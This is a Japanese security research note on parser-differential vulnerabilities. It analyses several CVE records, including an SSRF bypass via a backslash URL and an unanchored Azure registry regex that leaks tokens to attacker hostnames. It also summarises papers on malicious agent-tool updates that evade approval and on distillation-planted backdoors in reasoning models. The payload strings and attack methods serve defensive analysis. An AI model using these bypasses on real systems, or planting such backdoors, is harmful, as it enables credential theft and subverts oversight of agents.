# パーサ差分——検査と実行は別のバイトを読む

同じバッチ（2026-11-03 20:22）で五回くり返した一つのクラス。**セキュリティ特性は入力を解析する部品に実装され、効果は入力を*もう一度*解析する別の部品で起きる。** 以下のどの事例も「ガードはあるか」という素朴なテストには通る——ガードはあり、規則は書かれ、レビュアーは承認した——のに、成果物の上では失敗する。二つの部品が「この文字列は何か」で合意していないからだ。

隣接ファイル：[[security]]（本ファイルが拡張する CVE の棚）、[[vuln-supply]]（レコードの来歴と範囲）、[[harness-reliability]]（エージェント・ハーネス内の同じ継ぎ目）、[[fact-check]]（引用された数値とその出所の成果物）、[[disclosure-lag]]（修正とレコードの時刻）。

**主張：** *解析*で強制される境界では、分析の単位は規則ではなく**その対**である——どちらのパーサが検査し、どちらが実行し、同じコードか。パーサが一つの規則は検査であり、パーサが二つの規則は願望である。

## 1. SSRF：`urlparse` は一方のホストを検査し、`urllib3` は他方へダイヤルする

`CVE-2026-120630`（CrewAI、CNA は CERT/CC、公開 **2026-11-02T17:37:05Z**、ID 予約 **17:35:36Z**——89 秒差）。`http://127.0.0.1:8080\@1.1.1.1/` に対して：

| パーサ | ユーザー名 | ホスト |
|---|---|---|
| `urllib.parse.urlparse` | `127.0.0.1:8080\` | **1.1.1.1** |
| `urllib3.util.parse_url` | — | **127.0.0.1** |

Python 標準ライブラリはバックスラッシュをただの userinfo 文字として扱い、urllib3 は区切りとして扱う。だからガードは攻撃者が書いた*外部*ホストに対して承認し、ソケットはガードが見ていない内部ホストへ接続する。レコードを一次確認：

- `affected[]` = `{version: "0", lessThan: "1.15.17", versionType: "custom"}`、製品名は **CrewAI**（修正は `crewai-tools` に入った）。
- `problemTypes` は**自由文**——`"CWE-918 Server-Side Request Forgery (SSRF)"` で **`cweId` は未設定**。CWE の有無を見るチェックはこのレコードを CWE 無しと読む。
- CNA コンテナには **`metrics` キーが存在しない**。NVD も **0 件**、状態は **`Deferred`**——つまりここでは「CVSS」はどの当事者からも値を持たない。来歴ケース（4）に近い：方針による拒否ではなく、単に誰も採点していない。
- 修正は **PR #6981**「fix(tools): pin SSRF fetches to the validated peer IP」、**2026-08-17** マージ——レコードより **77 日**前——で、その標的はバックスラッシュでは*ない*。取得が「`validate_url` が検査した IP に接続していなかった」ためで、urllib3 がソケットを開くときに DNS を再解決するからだ。バックスラッシュの事例は接続時の IP 固定の副作用として閉じる。

同じ著者が IBM の Langflow で同一の形を見つけている：`CVE-2026-19304`、**7.7**（`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`、`CWE-918`）、NVD は `Analyzed` だが指標は `psirt@us.ibm.com` の一つだけで **`nvd@nist.gov` は 0 件**——これは追認ケースであり NVD の点数ではない。Langflow は KEV に **6** 件（`CVE-2025-3248` … `CVE-2026-9198`、カタログで確認）あるが、**`CVE-2026-19304` はそのどれでもない**——KEV が追うのは製品であって CVE ではない。

**持ち帰れる検査：** 拒否リストの強さは経路上で**最も狭い**パーサに等しい。ガードは、*実行者*が再解析する文字列で試すこと。リテラルの `127.0.0.1` では何も試せない。

## 2. アンカーの無い正規表現は後方一致である

`CVE-2026-105769`（kaniko **1.25.20** 未満、CNA は Chainguard、予約 2026-10-05T19:21Z、公開 **2026-11-02T16:49Z**、修正タグ `v1.25.20` は **2026-10-27T19:05Z**——6 日前）。kaniko は資格情報を持たないレジストリを `docker-credential-acr-env` に渡し、その判定は：

```
.*\.azurecr\.io|.*\.azurecr\.cn|.*\.azurecr\.de|.*\.azurecr\.us
```

アンカーが無いので、`.azurecr.io` を**含む**任意のホスト名が一致する——`x.azurecr.io.attacker.com` も。Dockerfile の `FROM x.azurecr.io.attacker.com/img`（または `COPY --from=`）で、ヘルパーはビルドの Azure アイデンティティ（サービスプリンシパルの環境変数、フェデレーテッド Workload Identity トークン、マネージド ID）を取りに行き、**攻撃者のホストへ二回 POST する**——`Authorization: Bearer` として一回、`access_token` フォーム項目として一回。点数 **9.3**（`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`）、`CWE-346` + `CWE-522`、`chainguard` の指標、NVD は `Awaiting Analysis` で **NVD 採点 0 件**。

成果物の分裂こそが教訓：kaniko はヘルパーを `third_party/` に**同梱**して自分の複製を直したので、kaniko のリリースは安全だが依存はそうではない——`chrismellard/docker-credential-acr-env` の issue **#21**「Azure AD token disclosed to attacker-controlled hosts: ACR hostname pattern is unanchored」は **2026-08-13** に起票され、**いまも open**（2026-11-03 確認）。同じヘルパーを取り込む他の何かは、まだ穴を持っている。

## 3. 全インフラ共通の一つの鍵が、フロントエンドに許された取得から漏れる

`CVE-2026-89292`（Eclipse Mnestix Browser **1.6.0 → <2.3.0**）：未認証の呼び出し元が、**設定された全インフラ**の `MNESTIX_BACKEND_API_KEY` を持ち出せた。**9.2 CVSS 4.0**（`AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N`——機密性のみだが、脆弱なシステムと後続システムの双方で高）、`CWE-918` **と** `CWE-522`、`emo@eclipse.org` の指標、NVD は **`Received`** で指標 0 件。二つの CWE が形を名指しする：鍵はブラウザ・フロントエンドが呼び出し元に代わって行うことを許されていた SSRF から漏れ、資格情報自体の保護が不足していた——**一つ**の鍵が導入先の全エンドポイントを開けるので、爆発半径は触られたホストではなく統合全体である。

日付はバックフィルで、コンテナで確認済み：ID 予約 **2026-09-11T12:47:13Z**、修正 **2.3.0** は **2026-09-10T13:59Z**（予約の*前日*）、レコード公開 **2026-11-03T09:31:27Z**——修正の **54 日**後。確認時点の最新リリースは **2.4.1**（2026-11-02T14:16Z）。参照は GitLab の作業項目二つだけでベンダー勧告ページが無いため、`descriptions[]` が公開された声明のすべてである。

## 4. 採点器もパーサである：同一出力で 22 ポイント

arXiv **2611.03377**（"Same Outputs, Different Scores"、2026-11-02 投稿）。査読付きマルチモーダル・ベンチマーク **8** 本の公式採点器を、16 GB GPU 一台に載るオープン VLM **5** 本で再現し、モデルが実際に何と答えたかをブラインドの人間＋LLM 審判で裁定（Cohen's **κ = 0.956**）。要旨より逐語：

> "The scoring rule alone moves accuracy by up to 22 points on identical outputs, yet exactly 0
> wherever a model emits clean option letters, so it hides on strong-model leaderboards."

被害はモデルの饒舌ではなく**フォールバック**にある：非準拠回答が最も多いベンチマークの採点アーティファクトはちょうど **0**（採点器が推測せず棄権する）。一方、非準拠率 **0.000** と測れた推論モデルでも、トレースの*どの正規表現一致をパーサが残すか*で **9.5 ポイント**動く。標準的な三つの戦略はいずれも安全でない——最寄りの選択肢へ丸めるのは与えられていない答えに点を与え、棄権は言葉で述べられた正解を捨て、尤度採点は答えトークンの事前分布に従う。したがって公表されたスコアは**能力 × パーサの運**であり、誤差はレビュアーが見る場所（フロンティアの行）でちょうど見えない。

## 5. 承認は入場時で、バイトはその後に変わる

arXiv **2611.01976**（"Beyond Prompt Injection: The Tool Update Gap in LLM Agent Security"、2026-11-01 投稿）。**ETUDE** は当初無害なツールの**更新**に悪性機能を埋め込み、正当な振る舞いは保つ。 adversarial な指示が存在しないので、モデル可視の内容を見る防御——プロンプト注入検出器、スキルレビュー、静的スキャン——には見るものが無い：更新されたコードは**コンテキスト窓の外**で実行される。

7 つのフレームワーク（Gemini CLI、Codex CLI、Claude Code、DeepSeek Harness、OpenCode、Pi、Goose）、3 つのツール機能、3 つの未承認目的で：**97.6% ASR**、正当タスク完了 **95.9%**、最強のプロンプト注入ベースラインを **85.1%** 上回る。著者自身の範囲限定（全文で grep 可能）：

> "We demonstrate attacks with researcher-authored tool implementations with carefully monitored
> permissions instead of modifying open-source tools in the wild, to avoid potential ethical
> issues."

そしてギャップを名指しする一文：フレームワークが確認を要求するとき、"the harness supplies a one-time approval for that call; this does not re-examine the updated implementation." 彼らの修正は帯域外の最小権限ツールポリシーを実行時に強制すること——**入場時ではなく実行時に拒否する**。設計上の含意：**ツール変更時の再承認**が最も安い制御であり、それはモデル側の制御ではまったくない。

## 6. バックドアは*より良い*チェックポイントとして届き、推論トレースに住む

arXiv **2611.00138**（Kerkoporta、2026-10-29 投稿）。構造化出力バックドア：コンテキストのどこかに置かれたトリガーが、推論モデルに攻撃者の選んだ**ツール呼び出し**を出させ、ハーネスがそれを実行する。蒸留軌跡による SFT で植え込まれ（教師 Qwen3.5-122B-A10B、約 1.5 万のコーディング課題）、被害者は Qwen3.5-4B と 9B、ハーネスは Claude Code・Codex・Pi の三つ、ペイロードは機密性／完全性／可用性にまたがる三つ。見出しは成功率**最大 96.2%**。

持ち帰るべき二点：

- **有用性の主張は一つのセルである。** 要旨の "The resulting models can outperform the clean baseline on standard utility benchmarks" が成り立つのは一行だけ——4B の TerminalBench-Lite、**タイムアウト除外**（クリーン **42.8** → バックドア **58.4**、+15.6）——同じチェックポイントは SWE-bench Verified ではベースライン**未満**（40.9 対 42.9、51.1 対 51.8）で、9B は報告されたどの構成でもベースラインを超えない。したがって毒された重みのリリースは、あなたが確認するベンチマークでは*良く*見えて届く。
- **汎化はトリガーではなく思考の連鎖に住む。** 推論トレースからトリガー／ペイロードの言及を取り除くと、分布外 ASR は **94.8–84.1%** から **1.0–0.0%** に落ちる。つまりトレースはスクリーニングが読むべき成果物であり、同時に CoT を隠す方針（テーゼ 9）が視界から取り除くものでもある。

## このバッチが生むチェックリスト

1. **両方のパーサを名指しする。** どの部品が*検査*し、どれが*実行*するか、コードを共有しているか。`^`/`$` の無い正規表現、標準ライブラリのパーサ対ライブラリのパーサ、採点器の正規表現対モデルの散文——すべて同じクラス。
2. **ガードが何に束縛されているかを問う。** ホスト名の文字列か、インストール時点のツールの同一性か、これから走る実装を覆わない承認トークンか。
3. **修正がどこに着地したかを問う。** 依存を同梱した製品か（kaniko）、他のすべてが取り込む依存か（未解決、#21）。
4. **ベンチマークの数値には、どの規則が生んだか**を問い、モデルがそもそもその規則の想定する形式を出すのかを問う——誤差は強いモデルでゼロであり、それが生き残る理由である。
5. **毒されたモデルでは品質低下を監視しない。** 実際に走るハーネスの下での挙動と来歴で篩う。トレースが読める面である。
